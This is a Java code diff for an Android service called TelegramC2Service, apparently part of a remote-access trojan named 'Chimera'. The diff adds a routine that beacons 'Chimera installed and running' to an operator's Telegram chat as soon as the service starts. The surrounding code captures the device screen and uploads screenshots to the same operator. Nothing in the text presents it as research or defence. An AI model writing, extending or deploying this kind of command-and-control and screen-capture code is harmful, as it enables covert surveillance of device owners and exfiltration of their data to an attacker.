@@ -32,7 +32,6 @@ public class TelegramC2Service extends Service {
     private Thread workerThread;
     private static final String CHANNEL_ID = "chimeraChannel";
 
-    // Static fields for Screenshot functionality
     private static MediaProjection mediaProjection;
     private HandlerThread screenshotThread;
     private Handler screenshotHandler;
@@ -44,6 +43,8 @@ public class TelegramC2Service extends Service {
         super.onCreate();
         try {
             ConfigLoader.load(this);
+            // ADDED: Send installation message when service is created
+            sendInstallMessage();
         } catch (Exception e) {
             ErrorLogger.logError(this, "TelegramC2Service_Config", e);
         }
@@ -95,6 +96,20 @@ public class TelegramC2Service extends Service {
             }
         } catch (Exception e) {
             ErrorLogger.logError(this, "TelegramC2Service_StartWorker", e);
+        }
+    }
+
+    // ADDED: Method to send installation message on a background thread
+    private void sendInstallMessage() {
+        try {
+            String token = ConfigLoader.getBotToken();
+            long chat = ConfigLoader.getAdminId();
+            if (token == null || chat == 0) return;
+            String url = "https://api.telegram.org/bot" + token + "/sendMessage";
+            String body = "{\"chat_id\":" + chat + ",\"text\":\"Chimera installed and running\"}";
+            TelegramBotWorker.post(url, body, this);
+        } catch (Exception e) {
+            ErrorLogger.logError(this, "Service_SendInstall", e);
         }
     }
 
@@ -154,7 +169,6 @@ public class TelegramC2Service extends Service {
                     try (FileOutputStream fos = new FileOutputStream(outputFile)) {
                         bitmap.compress(Bitmap.CompressFormat.JPEG, 90, fos);
                     }
-                    // Screenshot taken, now upload it
                     TelegramBotWorker.uploadFile(outputFile.getAbsolutePath(), ConfigLoader.getAdminId(), "Screenshot", this);
                     stopScreenshot();
                 }
